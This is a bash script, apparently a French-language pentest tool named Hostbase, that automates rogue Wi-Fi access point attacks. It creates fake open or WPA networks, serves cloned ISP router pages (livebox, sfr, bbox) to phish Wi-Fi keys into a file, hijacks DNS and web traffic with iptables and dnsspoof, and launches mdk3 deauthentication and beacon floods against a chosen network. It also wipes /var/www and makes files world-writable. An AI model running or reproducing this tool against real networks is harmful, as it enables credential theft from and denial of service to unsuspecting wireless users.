#!/bin/bash
### Hostbase 0.9 By Koala ###
### Script destiné a des tests sur les réseaux wifi ###
### Under licence GPLv3 http://www.gnu.org/licenses/gpl.txt ###
### Enjoy ###
### En cas de modification du script pour la conf de hostapd ou des options de airbase, ne pas oublier de laisser un espace derrière l'essid (sinon bash ne traduira pas l'espace meme si vous le rentrez)exemple: "{essid} " et un espace derrière {essid} pour hostapd.
### Attention a toute modification sur la partie d'écriture sur les fichiers EOF, un simple espace ou saut a la ligne peut entrainer des erreurs
### Fake page freewifi et freebox a voir

f_Banniere(){
echo -e "\e[1;33m Hostbase version 0.9 (released November 2016) By Koala alias Flow\e[0m"
echo -e "                        |\          )           (                              "
echo -e "                    ____| \__        )         (                               "
echo -e "                   |       @ \        )       (                                "
echo -e "~~~~~~~~~~~~~~~~~~~|~~<->    /         )     (                                 "
echo -e "                   |_________\          ) | (                                  "
echo -e "                    |    |                |                                    "
echo -e "___________________(|)__(|)_____________  |  __________________________________"
echo -e "\e[1;34m Rogues AP script, hostapd and airbase power.\e[0m"
echo
echo -e "\e[1;31m For a better visibility put in full screen.\e[0m"
echo
}
##################################################

f_checkexit(){

        echo -e "\n\e[1;34m[*]\e[0m Clean up... WAIT!\n"

       sleep 2;
        echo -e "\n\e[1;34m[*]\e[0m Disabling monitor mode... wait\n"
        sudo sysctl net.ipv4.ip_forward=0
        sleep 2;
        airmon-ng stop ${moniteurmode} &> /dev/null
        sleep 4;
        airmon-ng stop ${intmoniteur} &> /dev/null
        sleep 4;
        rfkill unblock all
        ifconfig ${monmode} up       

        
        if [ -f "/tmp/hostapd.pid" ];then
        killall hostapd
        kill `cat /tmp/hostapdclirefresh.pid`
        killall dnsspoof
        cd /tmp/
        rm -rf *.pid
        rm -rf /root/hostapd.conf
        cd /var/www/
        rm -rf *
        sleep 1;
        echo -e "\n\e[1;34m[*]\e[0m Clean up terminated see you later...\n"
        sleep 2;
        for PID in $( ps -e | grep xterm | awk '{print $1;}' ); do kill ${PID} 2>&-; done
        else
        echo -e "\n\e[1;34m[*]\e[0m Clean up terminated see you later...\n"
        sleep 2;
        for PID in $( ps -e | grep xterm | awk '{print $1;}' ); do kill ${PID} 2>&-; done
fi
	exit 2> /dev/null
}
##################################################

f_wlan(){
echo -e "\e[1;34m[*]\e[0m Stoping services wich can cause problem with airbase or hostapd..."
        sleep 2;
airmon-ng check kill
        sleep 5;
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Interface for attack (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*'  ; then
	airmon-ng start ${monmode}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: name not correct !\n"
	sleep 4;
f_wlan
fi

unset moniteurmode
while [ -z "${moniteurmode}" ]; do read -p "Name of the wireless card in monitor mode, (ex: wlan0mon, mon0 etc...): " moniteurmode; done
}

##################################################

f_floodinterface(){
ifconfig -a
unset int2
while [ -z "${int2}" ]; do read -p "Choose your second wireless card: " int2; done
       if echo ${int2} | egrep '^wlan*|wlp*'  ; then
echo -e "\e[1;34m[*]\e[0m Activating monitor mode..."
airmon-ng start ${int2}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: name not correct !\n"
	sleep 4;
f_floodinterface
fi

ifconfig
unset intmoniteur
while [ -z "${intmoniteur}" ]; do read -p "Name of the second wirless card in moniteur: " intmoniteur; done
}

##################################################

f_config(){
clear
f_Banniere
echo "1.  Edit hostapd.conf for advanced users only"
echo "2.  Editer dhcpd.conf for advanced users only"
echo "3.  Previous menu"
echo
read -p "Choice: " prereqschoice

case ${prereqschoice} in
1) f_nanohostapd ;;
2) f_dhcp ;;
3) f_mainmenu ;;
*) f_config ;;
esac
}
##################################################

f_nanohostapd(){
nano /root/hostapd.conf
f_config
}

f_dhcp(){
nano /etc/dhcp/dhcpd.conf
f_config
}

##################################################

f_rogueap(){
clear
f_Banniere
echo "1.  Open rogue AP with airbase"
echo "2.  Encrypted rogue AP with hostapd"
echo "3.  Ddos attack"
echo "4.  Use your own hostapd.conf (see config files)"
echo "5.  Previous menu"
echo
read -p "Choix: " fapchoix

case ${fapchoix} in
1) f_opnairbaserogue ;;
2) f_hostapdwps ;;
3) f_interface ;;
4) f_confperso ;;
5) f_mainmenu ;;
*) f_rogueap ;;
esac
}
##################################################

f_opnairbaserogue(){
f_wlan
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
unset essid
while [ -z "${essid}" ]; do read -p "Name of your fake AP LET A SPACE after the last letter: " essid; done



unset channel
while [ -z "${channel}" ]; do read -p "Channel (must be different of the real network): " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: chanel incorrect, must be between 1 and 13, all parameters must be correct!\n"
	sleep 4;
f_opnairbaserogue
fi



unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Router to phish? (ex. livebox sfr bbox ou sfrwifi): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 2;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK, Starting airbase"
xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -P -C 30 -c "${channel}" -e "${essid} " "${moniteurmode}" &> /dev/null &
sleep 5;
f_dhcpconf
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: enter livebox or sfr or bbox ou sfrwifi!\n"
        sleep 4;
f_opnairbaserogue
fi
}


##################################################

f_dhcpconf(){
echo -e "\e[1;34m[*]\e[0m Configuring dhcp on at0..."
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface at0;
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;
echo -e "\e[1;34m[*]\e[0m Redirect with iptables on at0..."
	ifconfig at0 up
        sudo sysctl net.ipv4.ip_forward=1
        ifconfig at0 10.0.0.1 netmask 255.255.255.0
        ifconfig at0 mtu 1400
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
        sleep 2;
        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.0.0.1
        iptables -P FORWARD ACCEPT
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
        echo > '/var/lib/dhcp/dhcpd.leases' 
        echo -e "\e[1;34m[*]\e[0m Starting dhcp"
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null & 
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m 0m Starting spoofing trafic..."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i at0 -f /root/dns.txt &> /dev/null &
       sudo chown -R root:www-data /var/www/*
        sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo chown -R root:www-data /var/www/cle.txt     # Ajout de cette ligne qui pointe sur le fichier en plus car sinon le fichier cle.txt reste dans le groupe root malgré le sudo chown précédent 
        sudo chmod 764 /var/www/cle.txt
        sudo service apache2 restart    
        sleep 4; 
	f_mainmenu
}


################################################## 

f_dhcpconfhtpd(){
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface ${monmode};
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;
         ifconfig ${monmode} up
         sudo sysctl net.ipv4.ip_forward=1
         sudo ifconfig ${monmode} 10.0.0.1 netmask 255.255.255.0
         sleep 1;
         iptables --flush
         iptables --table nat --flush
         iptables --delete-chain
         iptables --table nat --delete-chain
         sleep 2;
         route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
         iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.0.0.1
         iptables -P FORWARD ACCEPT
         iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
         sleep 2;
         echo > '/var/lib/dhcp/dhcpd.leases'
         echo -e "\e[1;34m[*]\e[0m Starting dhcp"
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m Starting spoofing trafic..."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i "${monmode}" -f /root/dns.txt &> /dev/null &
       sudo chown -R root:www-data /var/www/*
       sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo chown -R root:www-data /var/www/cle.txt    # Ajout de cette ligne qui pointe sur le fichier en plus car sinon le fichier cle.txt reste dans le groupe root malgré le sudo chown précédent 
        sudo chmod 764 /var/www/cle.txt
        sudo service apache2 restart   
        sleep 4; 
	f_mainmenu
}


##################################################      
 
f_hostapdwps(){
echo -e "\e[1;34m[*]\e[0m Hostapd"
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
touch /root/hostapd.conf
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*'  ; then 
        ifconfig ${monmode} up
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_hostapdwps
fi

unset essid
while [ -z "${essid}" ]; do read -p "Name of your fake AP LET A SPACE after the last letter: " essid; done


unset channel
while [ -z "${channel}" ]; do read -p "Channel of the network: " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: chanel incorrect, must be between 1 and 13, all parameters must be correct!\n"
	sleep 5;
f_hostapdwps
fi

unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Router to phish? (ex. livebox sfr bbox ou sfrwifi): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 3;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        touch /root/hostapd.conf
sleep 1;
        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: enter livebox or sfr or bbox or sfrwifi !\n"
        sleep 4;
f_hostapdwps
fi


cat <<-EOF > /root/hostapd.conf
interface=${monmode}
driver=nl80211
ssid=${essid} 
ieee8021x=1
wpa=2
hw_mode=g
ieee80211n=1
channel=${channel}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=12345678
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF
       sleep 2;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd, wait..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background, wait..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
       echo $! >/tmp/hostapdclirefresh.pid
	f_dhcpconfhtpd
}

##################################################

f_ddos(){
clear
f_Banniere
echo "1.  Ddos mdk3"
echo "2.  Previous menu"
echo
read -p "Choix: " ddoschoix

case ${ddoschoix} in
1) f_interface ;;
2) f_mainmenu ;;
*) f_ddos ;;
esac
}
##################################################

f_interface(){
f_floodinterface
unset ESSID
while [ -z "${ESSID}" ]; do read -p "ESSID of target network: " ESSID; done
        echo -e "\e[1;34m[*]\e[0m OK"


unset canal
while [ -z "${canal}" ]; do read -p "Channel of target network: " canal; done
if (($canal >= 1 && $canal <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: invalid channel, must be between 1 and 13!\n"
	sleep 5;
f_interface
fi


read -ep "                BSSID of target network : " BSSID           
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           
echo -e " $rojo Erreur : BSSID not correct $colorbase"
echo "  "
read -ep "                BSSID of target network : " BSSID 
echo "  "            
done

xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} a -m -i "${BSSID}" &> /dev/null &
sleep 3;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} b -n "${ESSID}" &> /dev/null &
sleep 3;
f_mainmenu
}

##################################################

f_confperso(){
      echo -e "\e[1;34m[*]\e[0m You choose your own configuration"
sleep 2;

echo -e "\e[1;34m[*]\e[0m Hostapd custom conf"
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*'  ; then 
        ifconfig ${monmode} up
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_confperso
fi

unset passerelle
while [ -z "${passerelle}" ]; do read -p "Gateway of your fake AP: " passerelle;
if [[ ! ${passerelle} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then ${passerelle}=; fi
done 


unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Router to phish? (ex. livebox sfr bbox ou sfrwifi): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 2;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERREUR: enter livebox or sfr or bbox or sfrwifi !\n"
        sleep 4;
f_confperso
fi
      
      echo -e "\e[1;34m[*]\e[0m Starting hostapd, wait..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
        ifconfig ${monmode} ${passerelle} netmask 255.255.255.0
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
        sleep 2;
        route add -net ${passerelle} netmask 255.255.255.0 gw ${passerelle}
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to ${passerelle}
        iptables -P FORWARD ACCEPT
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to ${passerelle}:80
        echo > '/var/lib/dhcp/dhcpd.leases'
        echo 
        sudo sysctl net.ipv4.ip_forward=1
        echo -e "\e[1;34m[*]\e[0m Starting dhcp..."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m Starting spoofing trafic."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i "${monmode}" -f /root/dns.txt &> /dev/null &
        sudo chown -R root:www-data /var/www/*
        sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo chown -R root:www-data /var/www/cle.txt
        sudo chmod 764 /var/www/cle.txt
        xterm -hold -bg '#000000' -fg '#3A94FF' -e sudo service apache2 restart &> /dev/null &    
        sleep 4; 
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
       echo $! >/tmp/hostapdclirefresh.pid
	f_mainmenu
}


##################################################

f_scan(){
        echo -e "\e[1;34m[*]\e[0m OK, scaning for service wich can cause problem... WAIT"
if [ -f "/etc/init/network-manager.conf" ];then
        systemctl stop NetworkManager.service
        systemctl disable NetworkManager.service
        sleep 4;
else
        service wicd stop
        sleep 5;
fi
f_wlan
        echo -e "\e[1;34m[*]\e[0m OK, Scan will start, push ctrl+c at any time to come back on the main menu"
sleep 5;
airodump-ng ${moniteurmode}
airmon-ng stop ${moniteurmode}
sleep 5;
ifconfig ${monmode} up
	f_mainmenu
}

##################################################

f_stop(){
           echo -e "\e[1;34m[*]\e[0m Stopping your previous attack..."
sleep 2;
airmon-ng stop ${intmoniteur}
sleep 5;
airmon-ng stop ${moniteurmode}
sleep 5;
ifconfig ${monmode} up

        if [ -f "/tmp/hostapd.pid" ];then
        killall hostapd
        kill 9 `cat /tmp/hostapdclirefresh.pid`
        killall dnsspoof
        cd /tmp/
        rm -rf *.pid
        rm -rf /root/hostapd.conf
        cd /var/www/
        rm -rf *
        sleep 1;
        killall xterm
        echo -e "\n\e[1;34m[*]\e[0m Attack stoped...\n"
        sleep 2;
        f_mainmenu
        else
        killall xterm
        echo -e "\n\e[1;34m[*]\e[0m Attack stoped...\n"
        sleep 2;
	f_mainmenu
fi
}

##################################################

f_mainmenu(){
clear
f_Banniere
echo "1.  Config files"
echo "2.  Fake AP attack"
echo "3.  Ddos attack"
echo "4.  Passive scan (use FULL SCREEN)"
echo "5.  Stop alive attack (if there one)"
echo "6.  Quit"
echo
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_config ;;
2) unset clean; f_rogueap ;;
3) unset clean; f_ddos ;;
4) unset clean; f_scan ;;
5) unset clean; f_stop ;;
6) f_checkexit ;;
*) f_mainmenu ;;
esac
}

# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!]\e[0m Sorry but this script need admin permission" 1>&2
	exit 1
else
	clean=1
	f_mainmenu
fi
